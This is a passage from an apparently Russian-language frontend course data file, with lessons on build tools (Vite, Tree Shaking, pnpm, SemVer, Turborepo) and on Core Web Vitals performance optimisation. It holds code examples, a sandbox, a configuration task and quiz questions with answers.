    "difficulty": "intermediate",
    "tags": [
      "build-tools",
      "vite",
      "webpack",
      "rollup",
      "esbuild",
      "pnpm",
      "npm",
      "tree-shaking",
      "monorepo",
      "turborepo"
    ],
    "theory": {
      "overview": "Современный фронтенд не работает без инструментов сборки. Знание того, как браузер получает код, как бандлер отсекает неиспользуемый код (**Tree Shaking**) и как пакетный менеджер организует зависимости — отличает опытного инженера от стажёра.\n\nВ этом уроке мы разберём революцию **Vite и Native ESM**, устройство пакетных менеджеров (почему индустрия переходит на **pnpm**) и основы управления мультипроектными монорепозиториями (**Turborepo**).",
      "sections": [
        {
          "title": "Эволюция сборщиков: Webpack против Vite (Native ESM + esbuild)",
          "content": "Как устроены сборщики нового и старого поколения:\n\n1. **Классический подход (Webpack)**:\n- Перед запуском dev-сервера Webpack обязан обойти ВСЕ файлы проекта, транспилировать их и собрать единый огромный бандл в памяти.\n- Проблема: на крупных проектах (1000+ модулей) «холодный старт» занимает 1–2 минуты, а Hot Module Replacement (HMR) начинает тормозить.\n\n2. **Революция Vite (Native ES Modules)**:\n- **Мгновенный старт (<300 мс)**: Vite НЕ собирает весь бандл на старте! Он запускает быстрый HTTP-сервер, а браузер сам запрашивает нужные файлы через нативные `import` (`<script type=\"module\">`).\n- **esbuild на языке Go**: предварительная оптимизация `node_modules` выполняется на компилируемом языке Go в **10–100 раз быстрее** любого JS-транспилятора!\n- **Rollup для Production**: для финального продакшен-бандла Vite использует зрелый Rollup с продвинутым Tree Shaking и генерацией чанков.",
          "image": {
            "src": "/images/lessons/web-build-tools-ecosystem.svg",
            "alt": "Эволюция сборщиков: Webpack vs Vite, Tree Shaking, pnpm и Monorepo",
            "caption": "Vite отдает нативные ES-модули по требованию, esbuild мгновенно компилирует зависимости, а pnpm экономит гигабайты диска"
          },
          "codeExample": {
            "language": "typescript",
            "code": "// vite.config.ts — лаконичная конфигурация современного проекта\nimport { defineConfig } from 'vite';\nimport react from '@vitejs/plugin-react';\nimport path from 'path';\n\nexport default defineConfig({\n  plugins: [react()],\n  resolve: {\n    alias: {\n      '@': path.resolve(__dirname, './src'), // Абсолютные импорты @/shared/ui\n    },\n  },\n  build: {\n    target: 'esnext',\n    sourcemap: true, // Генерация source maps для отладки ошибок на проде\n    rollupOptions: {\n      output: {\n        // Ручное разделение вендорных библиотек (Code Splitting)\n        manualChunks: {\n          vendor: ['react', 'react-dom'],\n        },\n      },\n    },\n  },\n});",
            "title": "Конфигурация Vite с алиасами и ручным Code Splitting",
            "explanation": "Конфигурация Vite в 10 раз компактнее Webpack, предоставляя из коробки TS, JSX, CSS модули и HMR."
          }
        },
        {
          "title": "Tree Shaking, Code Splitting и Source Maps",
          "content": "Техники уменьшения размера бандла и отладки:\n\n1. **Tree Shaking (Вытряхивание мертвого кода)**:\n- Алгоритм бандлера, который удаляет неиспользуемые `export` из итогового JavaScript-файла.\n- **Условие работы Tree Shaking**: использование статических ES-модулей (`import / export`). С динамическими `require()` из CommonJS Tree Shaking не работает!\n- Пример: если из библиотеки `lodash-es` вы импортируете `import { debounce } from 'lodash-es'`, в бандл попадет только функция debounce (2 КБ), а не вся библиотека (70 КБ).\n\n2. **Динамический импорт (Code Splitting)**:\n- `const AdminPanel = React.lazy(() => import('./AdminPanel'))` — код админки загрузится в браузер ТОЛЬКО тогда, когда пользователь перейдет на страницу админки, облегчая главный бандл для остальных пользователей.\n\n3. **Source Maps (`.map` файлы)**:\n- Файлы сопоставления между минифицированным production-кодом и исходными TypeScript-файлами. Позволяют видеть точную строчку ошибки в Sentry или DevTools.",
          "codeExample": {
            "language": "javascript",
            "code": "// ❌ Плохо: импорт всей библиотеки (тянет весь lodash в бандл, если CommonJS)\n// const _ = require('lodash');\n\n// ✅ Отлично: селективный ESM-импорт с поддержкой Tree Shaking\nimport { debounce } from 'lodash-es';\n\n// ✅ Динамический импорт для тяжелых библиотек по требованию\nbutton.addEventListener('click', async () => {\n  const { exportToExcel } = await import('./heavyExcelExporter.js');\n  exportToExcel(data);\n});",
            "title": "Tree Shaking и динамический импорт (Code Splitting)",
            "explanation": "Селективный ESM-импорт и динамический import() уменьшают начальный вес страницы на мегабайты."
          }
        },
        {
          "title": "Пакетные менеджеры: npm vs yarn vs pnpm и семантическое версионирование (SemVer)",
          "content": "Устройство экосистемы зависимостей:\n\n1. **Почему pnpm побеждает npm и Yarn**:\n- **Hard Links & Global Store**: pnpm хранит каждую версию пакета на диске компьютера ровно ОДИН РАЗ в глобальном хранилище. Проекты ссылаются на них через жесткие ссылки (Hard Links). Экономия: 50 ГБ диска!\n- **Защита от фантомных зависимостей (Phantom Dependencies)**: npm позволяет импортировать пакеты, которые вы не объявляли в `package.json` (но которые подтянул другой пакет). pnpm изолирует зависимости, предотвращая внезапные падения билда.\n\n2. **Семантическое версионирование (SemVer: `MAJOR.MINOR.PATCH`)**:\n- `MAJOR` (2.0.0) — ломающие обратную совместимость изменения (Breaking Changes).\n- `MINOR` (1.3.0) — новая функциональность без поломки совместимости.\n- `PATCH` (1.2.4) — исправление багов.\n- Префикс `^1.2.3` — разрешает обновление minor и patch (`< 2.0.0`).\n- Префикс `~1.2.3` — разрешает только patch обновления (`< 1.3.0`).\n\n3. **Роль lock-файлов (`pnpm-lock.yaml`, `package-lock.json`)**:\n- Фиксируют ТОЧНЫЕ версии всех подзависимостей и их контрольные суммы (хеши) для 100% повторяемости сборки на CI/CD.",
          "codeExample": {
            "language": "json",
            "code": "// package.json — зависимости и скрипты\n{\n  \"name\": \"intern-portal\",\n  \"version\": \"1.0.0\",\n  \"type\": \"module\",\n  \"scripts\": {\n    \"dev\": \"vite\",\n    \"build\": \"tsc && vite build\",\n    \"preview\": \"vite preview\"\n  },\n  \"dependencies\": {\n    \"react\": \"^18.3.1\",      // Разрешены обновления minor/patch\n    \"zustand\": \"~4.5.2\"       // Разрешены только bugfix patch\n  },\n  \"devDependencies\": {\n    \"typescript\": \"5.4.5\",   // Фиксированная точная версия\n    \"vite\": \"^5.2.0\"\n  }\n}",
            "title": "Структура package.json и семантическое версионирование",
            "explanation": "Четкое разделение dependencies и devDependencies оптимизирует установку на production-серверах."
          }
        },
        {
          "title": "Архитектура Монорепозиториев (Monorepo: Turborepo, pnpm workspaces)",
          "content": "Управление несколькими проектами в одном репозитории:\n\n1. **Что такое Монорепозиторий**:\n- Единый Git-репозиторий, содержащий несколько приложений (`apps/web`, `apps/admin`, `apps/mobile`) и общих пакетов (`packages/ui`, `packages/api-client`, `packages/tsconfig`).\n\n2. **Преимущества**:\n- Единая кодовая база и общий UI-kit.\n- Мгновенное распространение изменений: обновили компонент в `packages/ui` — он тут же доступен и в админке, и на витрине без публикации в npm registry!\n\n3. **Инструменты (Turborepo)**:\n- Умное кеширование результатов сборки (Remote Caching) и параллельный запуск задач.",
          "codeExample": {
            "language": "json",
            "code": "// pnpm-workspace.yaml — структура монорепозитория\n// packages:\n//   - 'apps/*'\n//   - 'packages/*'\n\n// turbo.json — пайплайн сборки монорепозитория\n{\n  \"$schema\": \"https://turbo.build/schema.json\",\n  \"pipeline\": {\n    \"build\": {\n      \"dependsOn\": [\"^build\"],\n      \"outputs\": [\"dist/**\", \".next/**\"]\n    },\n    \"lint\": {},\n    \"dev\": {\n      \"cache\": false,\n      \"persistent\": true\n    }\n  }\n}",
            "title": "Конфигурация Turborepo монорепозитория",
            "explanation": "Turborepo параллелит сборку приложений и кеширует результаты неизмененных пакетов."
          }
        }
      ],
      "seniorTips": [
        "Используйте `pnpm` вместо `npm` — он экономит десятки гигабайт памяти и защищает проект от коварных фантомных зависимостей.",
        "Всегда коммитьте lock-файл (`pnpm-lock.yaml` или `package-lock.json`) в Git — это гарантирует идентичность версий у всех разработчиков и на CI/CD.",
        "Используйте динамические импорты (`React.lazy`, `import()`) для тяжелых страниц и сторонних библиотек (графики, редакторы текста) для облегчения начального LCP.",
        "Для монорепозиториев используйте связку `pnpm workspaces` + `Turborepo` — это ускоряет CI-пайплайны в 5–10 раз благодаря кешированию."
      ],
      "commonMistakes": [
        {
          "bad": "// Импорт через CommonJS require в современном ESM-проекте\nconst lodash = require('lodash'); // ❌ Ломает Tree Shaking, тянет 70 КБ!",
          "good": "import { debounce } from 'lodash-es'; // ✅ Tree Shaking оставит только 2 КБ",
          "reason": "Tree Shaking работает только со статическим ES-модульным синтаксисом import/export."
        },
        {
          "bad": "// Игнорирование или удаление package-lock.json\n// В .gitignore: package-lock.json ❌",
          "good": "// Lock-файлы ОБЯЗАТЕЛЬНО хранятся в Git",
          "reason": "Без lock-файла npm install на сервере подтянет свежие версии зависимостей, которые могут содержать баги и сломать прод."
        },
        {
          "bad": "// Хранение dev-инструментов (Vite, TypeScript, ESLint) в dependencies",
          "good": "// Разделение: devDependencies для сборщиков/линтеров, dependencies — только для продакшен-кода",
          "reason": "devDependencies не нужны при запуске на production-сервере, что экономит память и ускоряет деплой."
        }
      ],
      "keyTakeaways": [
        "Vite революционизировал сборку благодаря Native ESM и компилятору esbuild на Go.",
        "Tree Shaking удаляет неиспользуемый dead-code только при использовании синтаксиса import/export.",
        "pnpm эффективнее npm благодаря глобальному хранилищу Hard Links и защите от фантомных зависимостей.",
        "SemVer (MAJOR.MINOR.PATCH) стандартизирует совместимость версий.",
        "Монорепозитории (Turborepo) упрощают переиспользование UI-kit и библиотек между несколькими проектами."
      ]
    },
    "sandbox": {
      "initialHtml": "<div id=\"bundler-app\">\n  <h3>Симулятор Tree Shaking и Бандлера</h3>\n  <div style=\"margin-bottom:12px;\">\n    <label><input type=\"checkbox\" id=\"chk-treeshake\" checked /> Включить Tree Shaking</label>\n  </div>\n  <button id=\"btn-bundle\" style=\"background:#2dff8a; color:#0a0e13; border:none; padding:8px 16px; font-weight:bold; cursor:pointer;\">Собрать Production Бандл (Rollup/Vite)</button>\n  <pre id=\"bundle-log\" style=\"margin-top:12px; color:#e6edf3; font-size:12px; line-height:1.5; background:#161b22; padding:12px; border-radius:6px;\"></pre>\n</div>",
      "initialCss": "#bundler-app { font-family: monospace; color: #e6edf3; padding: 16px; background: #0d1117; border-radius: 8px; }",
      "initialJs": "const log = document.getElementById('bundle-log');\nconst chk = document.getElementById('chk-treeshake');\n\ndocument.getElementById('btn-bundle').onclick = () => {\n  log.textContent = '⏳ Анализ графа зависимостей (ESM)...\\n';\n  setTimeout(() => {\n    if (chk.checked) {\n      log.textContent += '✓ Обнаружен неиспользуемый экспорт: formatLegacyXml (45 KB) — ВЫРЕЗАН\\n';\n      log.textContent += '✓ Обнаружен неиспользуемый экспорт: calculateDeprecatedTax (30 KB) — ВЫРЕЗАН\\n';\n      log.textContent += '📦 Итоговый размер бандла: dist/index.js — 18.4 KB (Gzip: 5.2 KB) ⚡ OPTIMAL';\n      log.style.color = '#2dff8a';\n    } else {\n      log.textContent += '⚠ Tree Shaking выключен: включены все 150 неиспользуемых функций\\n';\n      log.textContent += '📦 Итоговый размер бандла: dist/index.js — 93.4 KB (Тяжелый бандл!)';\n      log.style.color = '#ffb02e';\n    }\n  }, 300);\n};",
      "instructions": "Практика со сборщиками:\n1. Нажмите 'Собрать Production Бандл' с включенным Tree Shaking — размер 18.4 KB\n2. Снимите галочку и соберите снова — увидите раздутый бандл на 93.4 KB"
    },
    "task": {
      "title": "Настройка конфигурации сборщика Vite с алиасами путей и разделением чанков",
      "scenario": "Настройте файл vite.config.ts для производственного проекта: настройте Path Aliases для папки src (@/), включите генерацию Source Maps, и настройте manualChunks для выноса react и react-dom в отдельный vendor-чанк.",
      "criteria": [
        "Настроен алиас @/ указывающий на директорию src",
        "Включен флаг build.sourcemap: true",
        "Настроен manualChunks в rollupOptions для вендорных библиотек",
        "Подключен плагин react"
      ],
      "starterCode": {
        "js": "// Настройте конфигурацию vite.config.ts\nimport { defineConfig } from 'vite';\n\nexport default defineConfig({\n  // Ваш конфиг\n});"
      },
      "hints": [
        "import path from 'path';",
        "resolve: { alias: { '@': path.resolve(__dirname, './src') } }",
        "rollupOptions: { output: { manualChunks: { vendor: ['react', 'react-dom'] } } }"
      ],
      "solution": {
        "js": "import { defineConfig } from 'vite';\nimport react from '@vitejs/plugin-react';\nimport path from 'path';\n\nexport default defineConfig({\n  plugins: [react()],\n  resolve: {\n    alias: {\n      '@': path.resolve(__dirname, './src'),\n    },\n  },\n  build: {\n    target: 'esnext',\n    sourcemap: true,\n    rollupOptions: {\n      output: {\n        manualChunks: {\n          vendor: ['react', 'react-dom'],\n        },\n      },\n    },\n  },\n});",
        "explanation": "Конфигурация оптимизирует проект: ускоряет навигацию по файлам через алиасы @/ и обеспечивает долговечный кеш вендорных библиотек."
      }
    },
    "quiz": {
      "questions": [
        {
          "id": "pro4-q1",
          "question": "Почему сервер разработки Vite стартует почти мгновенно даже на крупном проекте?",
          "options": [
            "Он собирает проект в фоне и показывает страницу, не дожидаясь окончания сборки",
            "Он не собирает бандл на старте: модули отдаются браузеру по запросу как нативные",
            "Он хранит готовый бандл в глобальном кеше и переиспользует его между проектами",
            "Он пропускает обработку зависимостей, подключая их прямо из хранилища пакетов"
          ],
          "correctIndex": 1,
          "explanation": "Классический сборщик обязан пройти весь граф модулей и собрать бандл, прежде чем показать первую страницу, — на большом проекте это десятки секунд. Vite опирается на поддержку модулей в самом браузере: он отдаёт исходники по мере запроса, преобразуя каждый файл на лету. Зависимости он всё же обрабатывает заранее, но делает это компилятором на Go, который работает на порядок быстрее инструментов на JavaScript."
        },
        {
          "id": "pro4-q2",
          "question": "Какой из вариантов позволит сборщику выбросить неиспользуемый код и почему?",
          "codeSnippet": "// вариант А\nconst { debounce } = require('lodash');\n\n// вариант Б\nimport { debounce } from 'lodash-es';",
          "options": [
            "Вариант Б: статические импорты разбираются при сборке, а требование — во время работы",
            "Вариант А: подключение по требованию загружает только затребованную функцию",
            "Оба: современные сборщики одинаково хорошо анализируют любые формы подключения",
            "Ни один: удаление лишнего кода зависит исключительно от настроек минификатора"
          ],
          "correctIndex": 0,
          "explanation": "Удаление мёртвого кода опирается на статический анализ: сборщик должен понять состав импортов, не выполняя код. Синтаксис модулей это позволяет — имена известны на этапе сборки. Старое подключение через требование вычисляется во время работы, путь к модулю там может быть даже переменной, поэтому сборщик вынужден включить пакет целиком. Отсюда и практика брать сборки библиотек в модульном формате."
        },
        {
          "id": "pro4-q3",
          "question": "Что такое фантомная зависимость и как pnpm от неё защищает?",
          "options": [
            "Пакет, объявленный, но ни разу не использованный; менеджер удаляет его автоматически",
            "Пакет, установленный дважды в разных версиях; общее хранилище оставляет одну копию",
            "Пакет с уязвимостью, попавший в сборку; менеджер блокирует установку таких версий",
            "Пакет, который импортируется, но не объявлен; строгая структура папок делает его недоступным"
          ],
          "correctIndex": 3,
          "explanation": "Классические менеджеры раскладывают все пакеты плоским списком, поэтому код может импортировать чужую подзависимость, о которой в описании пакета нет ни слова. Работает это ровно до того дня, когда соседняя библиотека обновится и перестанет её тянуть. В pnpm в корне видны только объявленные пакеты, остальные лежат в изолированном хранилище и связаны жёсткими ссылками — заодно экономится место на диске."
        },
        {
          "id": "pro4-q4",
          "question": "В описании пакета указана версия `^2.4.1`. Какие версии подойдут при установке?",
          "options": [
            "Ровно 2.4.1 — этот символ жёстко фиксирует единственную версию",
            "Любая начиная с 2.4.1, включая мажорные обновления пакета",
            "Любая от 2.4.1 включительно и строго ниже 2.5.0",
            "Любая от 2.4.1 включительно и строго ниже 3.0.0"
          ],
          "correctIndex": 3,
          "explanation": "Версия состоит из трёх чисел: мажорного, минорного и патча. Мажорное меняется при несовместимых изменениях, поэтому этот символ разрешает любые обновления, кроме смены первого числа. Ограничение только патчами задаётся символом тильды, а жёсткая фиксация — записью версии без символов. Реальные же версии для конкретной установки фиксирует lock-файл."
        },
        {
          "id": "pro4-q5",
          "question": "Разработчик добавил lock-файл в список игнорируемых Git. Чем это грозит команде?",
          "options": [
            "Ничем: файл восстанавливается автоматически при первой же установке зависимостей",
            "Установка пакетов замедлится, поскольку дерево придётся разрешать каждый раз заново",
            "Сборки перестанут быть воспроизводимыми: у всех подтянутся разные версии подзависимостей",
            "Сборщик потеряет возможность удалять неиспользуемый код из установленных зависимостей"
          ],
          "correctIndex": 2,
          "explanation": "Описание пакета задаёт диапазоны, а конкретные версии всего дерева, включая подзависимости чужих пакетов, фиксирует именно lock-файл. Без него установка в разное время даёт разные наборы версий: локально всё работает, на сервере сборка падает, а воспроизвести ошибку невозможно. Файл коммитят всегда, а конфликты в нём разрешают повторной установкой, а не ручной правкой."
        }
      ]
    }
  },
  {
    "id": "pro-5",
    "moduleId": "pro",
    "level": 5,
    "title": "Производительность фронтенда (Web Performance) и Core Web Vitals",
    "subtitle": "LCP, INP, CLS, оптимизация загрузки ресурсов, Main Thread и профилирование",
    "description": "Освойте оптимизацию веб-приложений по стандарту Core Web Vitals: сокращение LCP (Largest Contentful Paint), улучшение отзывчивости INP (Interaction to Next Paint), устранение дёргания верстки CLS, разгрузку Main Thread и аудит в Lighthouse.",
    "estimatedMinutes": 65,
    "difficulty": "intermediate",
    "tags": [
      "performance",
      "core-web-vitals",
      "lcp",
      "inp",
      "cls",
      "lighthouse",
      "optimization",
      "lazy-loading"
    ],
    "theory": {
      "overview": "Скорость загрузки и отзывчивость интерфейса напрямую определяют бизнес-показатели продукта: конверсию, удержание пользователей и позиции в поисковой выдаче Google и Яндекс.\n\nПо статистике Google, увеличение задержки ответа всего на 100 мс снижает конверсию на 7%, а более 50% мобильных пользователей закрывают сайт, если он загружается дольше 3 секунд. В этом уроке мы разберём ключевые метрики Core Web Vitals (LCP, INP, CLS), научимся профилировать код в Chrome DevTools и применять лучшие архитектурные практики ускорения рендеринга.",
      "sections": [
        {
          "title": "Core Web Vitals от Google: LCP, INP и CLS",
          "content": "Core Web Vitals — это набор ключевых стандартизированных метрик Google, оценивающих реальный пользовательский опыт взаимодействия с веб-страницей (Real User Monitoring — RUM):\n\n1. LCP (Largest Contentful Paint — Скорость загрузки главного контента):\n- Измеряет время от начала загрузки страницы до момента, когда самый крупный видимый блок контента в первом экране (баннер, заголовок h1 или видео) полностью отрисован.\n- Норма: `<= 2.5 секунды` (зелёная зона). От 2.5 до 4.0 с — требует улучшения, > 4.0 с — плохо.\n\n2. INP (Interaction to Next Paint — Отзывчивость интерфейса):\n- Сменил устаревшую метрику FID в 2024 году. Измеряет задержку между ЛЮБЫМ действием пользователя (клик, тап по экрану, нажатие клавиши) и моментом, когда браузер смог отрисовать следующий обновлённый кадр на экране.\n- Норма: `<= 200 миллисекунд`. От 200 до 500 мс — требует улучшения, > 500 мс — плохо.\n\n3. CLS (Cumulative Layout Shift — Визуальная стабильность):\n- Измеряет суммарный сдвиг элементов верстки в процессе загрузки страницы (когда текст или кнопки внезапно «прыгают» вниз из-за запоздалой подгрузки картинки или рекламного баннера без заданных размеров).\n- Норма: `<= 0.1` (безразмерный коэффициент). От 0.1 до 0.25 — средне, > 0.25 — плохо.",
          "image": {
            "src": "/images/lessons/web-performance-metrics.svg",
            "alt": "Метрики Core Web Vitals: LCP, INP, CLS и шкалы оценки Google",
            "caption": "Core Web Vitals оценивает скорость первого экрана (LCP <= 2.5s), отзывчивость на действия (INP <= 200ms) и стабильность верстки (CLS <= 0.1)"
          },
          "codeExample": {
            "language": "javascript",
            "code": "// Измерение Core Web Vitals в продакшене через библиотеку web-vitals:\nimport { onLCP, onINP, onCLS } from 'web-vitals';\n\nfunction sendToAnalytics({ name, value, id, rating }) {\n  console.log(`[Metric] ${name}: ${value.toFixed(2)} (${rating})`);\n  // Отправка в систему мониторинга (Google Analytics / Sentry / Datadog)\n  navigator.sendBeacon('/analytics', JSON.stringify({ name, value, id }));\n}\n\nonLCP(sendToAnalytics);\nonINP(sendToAnalytics);\nonCLS(sendToAnalytics);",
            "title": "Сбор реальных метрик Core Web Vitals в браузере",
            "explanation": "Пакет web-vitals перехватывает PerformanceObserver события браузера и логирует статус LCP, INP и CLS с оценкой (good, needs-improvement, poor)."
          }
        },
        {
          "title": "Оптимизация загрузки ресурсов и ускорение LCP",
          "content": "Для достижения LCP <= 2.5s необходимо оптимизировать путь доставки критических ресурсов (Critical Rendering Path):\n\n1. Оптимизация изображений:\n- Современные форматы: `AVIF` (сжатие на 50% лучше JPEG) и `WebP` с фоллбэком через тег `<picture>`.\n- Отложенная загрузка: `loading=\"lazy\"` для ВСЕХ картинок ниже первого экрана.\n- Высокий приоритет для LCP: `fetchpriority=\"high\"` на главном баннере первого экрана (НИКОГДА не ставьте `loading=\"lazy\"` на главный баннер!).\n\n2. Оптимизация веб-шрифтов:\n- Предзагрузка критического шрифта: `<link rel=\"preload\" href=\"/font.woff2\" as=\"font\" type=\"font/woff2\" crossorigin>`.\n- Правило `font-display: swap;` в CSS: мгновенно показывает системный шрифт, заменяя его на кастомный по мере загрузки (устраняет эффект невидимого текста FOIT).\n\n3. Сетевая оптимизация и кэширование:\n- Сжатие ответов сервера: алгоритм `Brotli` (`br`) эффективнее `gzip` на 15–20%.\n- Использование CDN (Content Delivery Network) для приближения статики к пользователю.\n- Агрессивное кэширование статических ассетов с хэшами в именах: `Cache-Control: public, max-age=31536000, immutable`.",
          "codeExample": {
            "language": "html",
            "code": "<head>\n  <!-- Предзагрузка главного LCP-изображения и шрифта -->\n  <link rel=\"preload\" fetchpriority=\"high\" as=\"image\" href=\"/banner.avif\" type=\"image/avif\" />\n  <link rel=\"preload\" as=\"font\" href=\"/fonts/inter.woff2\" type=\"font/woff2\" crossorigin />\n</head>\n<body>\n  <!-- Идеальная разметка адаптивного LCP-изображения -->\n  <picture>\n    <source srcset=\"/banner.avif\" type=\"image/avif\" />\n    <source srcset=\"/banner.webp\" type=\"image/webp\" />\n    <img\n      src=\"/banner.jpg\"\n      alt=\"Курс Frontend-разработки\"\n      width=\"1200\"\n      height=\"630\"\n      fetchpriority=\"high\"\n      decoding=\"async\"\n    />\n  </picture>\n</body>",
            "title": "Идеальная оптимизация LCP-изображения",
            "explanation": "picture с AVIF/WebP снижает вес картинки. fetchpriority='high' загружает её первым приоритетом. width/height предотвращают сдвиг макета CLS."
          }
        },
        {
          "title": "Разгрузка Main Thread и оптимизация отзывчивости (INP)",
          "content": "JavaScript в браузере выполняется в едином главном потоке (Main Thread), где также происходят парсинг HTML, пересчет стилей (Style Recalculation) и отрисовка кадров (Paint).\n\nЕсли скрипт выполняется дольше 50 миллисекунд — это Длинная Задача (Long Task). Во время Long Task браузер полностью зависает (Freezes): не реагирует на клики, скролл и ввод текста, что катастрофически ухудшает метрику INP.\n\nАрхитектурные методы оптимизации INP:\n\n1. Разбивка Long Tasks (Yielding to Main Thread):\nРазбивайте тяжелые циклы и вычисления на мелкие чанки с уступкой потока браузеру через `await scheduler.yield()` или `setTimeout(resolve, 0)`.\n\n2. Паттерны Debounce и Throttle:\n- `Debounce` — откладывает вызов функции до тех пор, пока не пройдет пауза в событиях (идеально для живого поиска `input`).\n- `Throttle` — гарантирует вызов функции не чаще одного раза в N миллисекунд (для `scroll` и `resize`).\n\n3. Web Workers:\nВынос тяжелых не-DOM операций (обработка больших массивов, криптография, парсинг Excel/CSV, сжатие изображений) в отдельный фоновый поток (Background Worker Thread).\n\n4. Виртуализация списков (Virtualization):\nРендеринг в DOM только тех 10–20 элементов, которые видны на экране прямо сейчас, вместо отрисовки 10 000 DOM-узлов (библиотеки TanStack Virtual, react-window).",
          "codeExample": {
            "language": "javascript",
            "code": "// 1. Утилита debounce для защиты от перегрузки Main Thread при вводе\nfunction debounce(fn, delayMs = 300) {\n  let timer = null;\n  return (...args) => {\n    clearTimeout(timer);\n    timer = setTimeout(() => fn(...args), delayMs);\n  };\n}\n\nconst searchInput = document.getElementById('search');\nsearchInput.addEventListener('input', debounce((e) => {\n  fetchSearchResults(e.target.value); // Вызовется только через 300мс после окончания ввода\n}, 300));\n\n// 2. Разбивка длинной задачи через yield\nasync function processLargeDataChunked(items) {\n  for (let i = 0; i < items.length; i++) {\n    processItem(items[i]);\n    // Каждые 100 элементов даем браузеру отрисовать кадр и обработать клики\n    if (i % 100 === 0 && 'scheduler' in window) {\n      await scheduler.yield();\n    }\n  }\n}",
            "title": "Debounce и разбивка длинных задач для идеального INP",
            "explanation": "debounce предотвращает лавину запросов при наборе текста. scheduler.yield возвращает управление браузеру для плавной отрисовки интерфейса."
          }
        },
        {
          "title": "Борьба со сдвигами верстки (CLS) и аудит в Lighthouse",
          "content": "Cumulative Layout Shift (CLS) возникает, когда видимый элемент меняет свое положение между двумя кадрами без взаимодействия со стороны пользователя.\n\nГлавные причины и решения CLS:\n\n1. Картинки и видео без размеров:\n- ❌ Ошибка: `<img src=\"pic.jpg\">` (браузер выделяет 0px, а после загрузки картинка расталкивает контент вниз!).\n- ✅ Решение: ВСЕГДА указывать атрибуты `width` и `height` на теге `<img>` или задавать в CSS `aspect-ratio: 16 / 9;`.\n\n2. Динамический контент и реклама:\n- Резервируйте фиксированное минимальное пространство (`min-height`) под рекламные баннеры, виджеты погоды и комментарии до их загрузки.\n\n3. Скелетонные экраны (Skeleton Loading) вместо спиннеров:\nСкелетоны занимают точные геометрические размеры будущего контента, предотвращая скачки макета при ответе API.\n\nИнструменты профилирования производительности:\n- **Lighthouse** (вкладка в Chrome DevTools) — комплексный аудит Performance, Accessibility, Best Practices, SEO.\n- **Performance Panel** в DevTools — детальный таймлайн кадров, Long Tasks (красные треугольники), Flame Chart вызовов функций.\n- **PageSpeed Insights** — реальные полевые данные пользователей (CrUX — Chrome User Experience Report).",
          "codeExample": {
            "language": "css",
            "code": "/* 1. Резервирование пропорций через aspect-ratio (защита от CLS) */\n.responsive-image {\n  width: 100%;\n  height: auto;\n  aspect-ratio: 16 / 9; /* Браузер сразу резервирует место до загрузки! */\n  object-fit: cover;\n}\n\n/* 2. Скелетон-плейсхолдер фиксированной высоты */\n.card-skeleton {\n  min-height: 240px;\n  background: linear-gradient(90deg, #161b22 25%, #21262d 50%, #161b22 75%);\n  background-size: 200% 100%;\n  animation: skeletonShimmer 1.5s infinite;\n  border-radius: 8px;\n}\n\n@keyframes skeletonShimmer {\n  0% { background-position: 200% 0; }\n  100% { background-position: -200% 0; }\n}",
            "title": "Защита от CLS: aspect-ratio и Skeleton Shimmer",
            "explanation": "aspect-ratio резервирует точное пространство на экране до скачивания файла картинки, снижая CLS до нуля. Скелетон исключает скачки при подгрузке данных."
          }
        }
      ],
      "seniorTips": [
        "НИКОГДА не добавляйте `loading=\"lazy\"` на главное LCP-изображение первого экрана. Это задерживает его скачивание браузером на 1–2 секунды! Используйте `fetchpriority=\"high\"`.",
        "Всегда указывайте атрибуты `width` и `height` на всех тегах `<img>`. В современном HTML они не задают жесткий пиксельный размер, а сообщают браузеру соотношение сторон (Aspect Ratio).",
        "Применяйте `font-display: swap` для шрифтов в `@font-face` — это исключает невидимый текст (FOIT) и мгновенно показывает системный шрифт.",
        "Тестируйте сайт в Lighthouse с включенным мобильным профилем и 4x CPU Throttling — только так можно увидеть реальный пользовательский опыт на бюджетных смартфонах."
      ],
      "commonMistakes": [
        {
          "bad": "<!-- lazy-loading на главной картинке первого экрана -->\n<img src=\"/hero-banner.jpg\" loading=\"lazy\" />",
          "good": "<img src=\"/hero-banner.jpg\" fetchpriority=\"high\" width=\"1200\" height=\"600\" />",
          "reason": "loading='lazy' на первом экране заставляет браузер отложить загрузку LCP-баннера, что обрушивает оценку производительности в красную зону."
        },
        {
          "bad": "<!-- Изображения без указания размеров -->\n<img src=\"/card-thumb.jpg\" style=\"width: 100%;\" />",
          "good": "<img src=\"/card-thumb.jpg\" width=\"400\" height=\"225\" style=\"width: 100%; height: auto; aspect-ratio: 16/9;\" />",
          "reason": "Без указания пропорций браузер не знает высоту картинки до её скачивания, что приводит к резкому сдвигу контента вниз (высокий CLS)."
        },
        {
          "bad": "// Синхронный тяжелый цикл на 500 000 элементов в обработчике клика\nbutton.addEventListener('click', () => { heavyCalculation(); });",
          "good": "// Вынос в Web Worker или разбивка с debounce/yield\nbutton.addEventListener('click', () => { worker.postMessage('start'); });",
          "reason": "Синхронный тяжелый код блокирует Main Thread дольше 50мс (Long Task), замораживая весь интерфейс и разрушая метрику INP."
        }
      ],
      "keyTakeaways": [
        "Core Web Vitals состоит из трёх столпов: LCP (загрузка <= 2.5s), INP (отзывчивость <= 200ms) и CLS (стабильность <= 0.1).",
        "Для LCP: используйте форматы AVIF/WebP, предзагрузку шрифтов preload, CDN и `fetchpriority=\"high\"` на главном баннере.",
        "Для INP: разбивайте задачи дольше 50мс (Long Tasks) через `scheduler.yield()`, используйте `debounce`/`throttle` и Web Workers.",
        "Для CLS: всегда задавайте `width`/`height` или `aspect-ratio` картинкам, используйте скелетоны и резервируйте место под баннеры.",
        "Lighthouse и Performance Panel в Chrome DevTools — основные инструменты диагностики узких мест производительности."
      ]
    },
    "sandbox": {
      "initialHtml": "<div id=\"perf-app\">\n  <h3>Симулятор оптимизации ввода (Debounce)</h3>\n  <input id=\"search-input\" placeholder=\"Начните быстро печатать текст...\" style=\"width:100%; padding:8px; background:#03060a; color:#2dff8a; border:1px solid #30363d; font-family:monospace;\" />\n  <div style=\"display:flex; gap:16px; margin-top:12px;\">\n    <div style=\"flex:1; padding:10px; background:#161b22; border:1px solid #f85149; border-radius:6px;\">\n      <strong style=\"color:#f85149;\">Без Debounce (вызовы API):</strong>\n      <div id=\"raw-count\" style=\"font-size:24px; font-weight:bold;\">0</div>\n    </div>\n    <div style=\"flex:1; padding:10px; background:#161b22; border:1px solid #2dff8a; border-radius:6px;\">\n      <strong style=\"color:#2dff8a;\">С Debounce 300ms:</strong>\n      <div id=\"debounced-count\" style=\"font-size:24px; font-weight:bold;\">0</div>\n    </div>\n  </div>\n</div>",
